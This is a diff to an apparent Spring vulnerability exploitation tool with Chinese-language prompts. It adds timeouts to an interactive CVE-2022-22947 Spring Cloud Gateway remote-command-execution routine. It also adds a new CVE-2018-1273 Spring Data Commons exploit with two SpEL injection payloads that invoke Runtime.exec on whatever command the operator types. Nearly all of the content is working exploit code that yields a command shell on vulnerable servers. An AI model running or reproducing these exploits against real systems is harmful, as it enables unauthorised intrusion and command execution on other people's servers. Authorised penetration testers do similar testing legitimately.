@@ -1,5 +1,8 @@
 #!/usr/bin/env python
 # coding=utf-8
+  ################
+ #   AabyssZG   #
+################
 
 import requests, sys, json, re, random, base64
 from termcolor import cprint
@@ -135,9 +138,9 @@ def CVE_2022_22947(url, proxies):
 
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
+        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             cprint("[+] Payload已经输出，回显结果如下：", "red")
             print('\n')
@@ -147,14 +150,14 @@ def CVE_2022_22947(url, proxies):
             while 1:
                 Cmd = input("[+] 请输入要执行的命令>>> ")
                 if Cmd == "exit":
-                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
                     sys.exit(0)
                 else:
                     payload3 = payload2.replace('whoami', Cmd)
-                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, json=json ,verify=False, proxies=proxies)
-                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, timeout=10, json=json ,verify=False, proxies=proxies)
+                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
                     result = re3.text
                     cprint(result ,"green")
                     print('\n')
@@ -356,6 +359,51 @@ def Eureka_xstream_RCE(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
+def CVE_2018_1273(url,proxies):
+    cprint("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======","green")
+    Headers = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/x-www-form-urlencoded"
+        }
+    path1 = 'users'
+    path2 = 'users?page=0&size=5'
+    payload1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
+    payload2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('whoami')\")]=asdf"
+    try:
+        requests.packages.urllib3.disable_warnings()
+        urltest1 = url + path1
+        urltest2 = url + path2
+        re1 = requests.get(url=urltest1, headers=Headers, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        code1 = re1.status_code
+        if ((int(code1) == 200) and ('Users' in str(re1.text))):
+            cprint("[+] 发现Spring_Data_Commons远程命令执行漏洞：", "red")
+            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
+            print("[+] 执行命令模块（输入exit退出）")
+            choose = input("[+] 总共有两种Payload，请输入1或者2>>> ")
+            while 1:
+                Cmd = input("[+] 请输入要执行的命令>>> ")
+                if (choose == '1'):
+                    payload3 = payload1.replace('whoami', Cmd)
+                else:
+                    payload3 = payload2.replace('whoami', Cmd)
+                if Cmd == "exit":
+                    sys.exit(0)
+                else:
+                    re2 = requests.post(url=urltest2, data=payload3, headers=Headers, timeout=10, verify=False, proxies=proxies)
+                    code2 = re2.status_code
+                    if (int(code2) != 503):
+                        cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")
+        else:
+            cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
 def vul(url,proxies):
     functions = {
         1: CVE_2021_21234,
@@ -366,6 +414,7 @@ def vul(url,proxies):
         6: JolokiaRCE,
         7: JeeSpring_2023,
         8: Eureka_xstream_RCE,
+        9: CVE_2018_1273,
     }
     cprint("[+] 目前漏洞库内容如下：","green")
     for num, func in functions.items():
@@ -373,7 +422,7 @@ def vul(url,proxies):
     try:
         choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
         if choices == '':
-            choices = "1,2,3,4,5,6,7,8"
+            choices = "1,2,3,4,5,6,7,8,9"
         choices = [int(choice) for choice in choices.split(',')]
     except Exception as e:
         print("请不要输入无意义的字符串")
